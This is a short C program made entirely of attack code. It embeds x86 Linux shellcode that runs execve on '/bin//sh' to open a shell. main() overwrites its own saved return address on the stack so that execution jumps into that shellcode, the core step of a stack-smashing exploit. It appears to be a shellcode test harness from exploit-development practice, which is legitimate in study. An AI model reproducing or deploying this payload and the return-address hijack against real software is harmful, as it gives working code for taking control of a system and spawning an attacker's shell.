#include <unistd.h>

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x31\xf6\xb0\x0b\xcd\x80";

int main(int argc, char* argv[]) {
    int *ret;
    ret = (int*)&ret + 2;
    (*ret) = (int)shellcode;
}
